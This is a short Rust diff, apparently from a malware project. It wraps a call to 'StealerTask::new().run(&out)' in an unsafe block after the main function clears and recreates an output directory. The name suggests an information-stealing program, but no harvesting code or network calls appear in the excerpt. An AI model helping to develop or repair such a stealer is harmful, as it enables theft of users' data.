@@ -32,6 +32,9 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let _ = out.remove_dir_all();
     let _ = out.mkdir();
     
-    StealerTask::new().run(&out);
+    unsafe {
+        StealerTask::new().run(&out);
+    }
+    
     0
 }
